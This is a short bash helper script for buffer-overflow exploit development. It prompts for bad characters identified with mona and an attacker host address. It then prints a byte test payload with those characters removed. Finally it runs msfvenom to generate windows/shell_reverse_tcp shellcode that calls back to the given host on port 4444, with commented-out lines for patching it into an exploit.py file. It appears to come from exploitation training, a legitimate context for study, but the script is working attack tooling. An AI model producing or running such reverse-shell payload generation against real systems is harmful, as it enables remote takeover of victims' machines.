#!/bin/bash

echo "Note: Provide empty inputs to generate a full characterset payload."
read -a badchars -p 'Specify outlying bad characters (from mona): ' 
read -a lhost -p 'Specify lhost (for venom): '

if [ -z "$badchars" ]
then
echo "[+] Full bad characterset payload: "
echo "payload = \"$(python2 badcharset.py)\""

#echo "[+] Modifying exploit.py payload with full characterset..."
#sed  "s/payload = \".*\"$/payload = \""$(python2 badcharset.py)"\"/g" -i exploit.py
fi

if [ -n "$badchars" ]
then
    echo -n "[+] Bad character shellcode: "
    bc="$(echo ${badchars[@]} | sed 's/ /\\x/g' | sed 's/^/\\x/g' | tr '' '\n')"
    echo "$bc"

    echo -n "[+] Bad character deduction: "
    pattern=$(for i in ${badchars[@]}; do echo -n "s+x$i\\\++g; " ; done)
    #echo "$pattern"
    echo "$(python2 badcharset.py)" | sed "$pattern"

    #echo "[+] Modifying exploit.py payload with full characterset..."
    #sed  "s/payload = \".*\"$/payload = \""$pattern"\"/g" -i exploit.py

    echo -n "[+] msfvenom output: "
    echo "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b $bc -f c)"
fi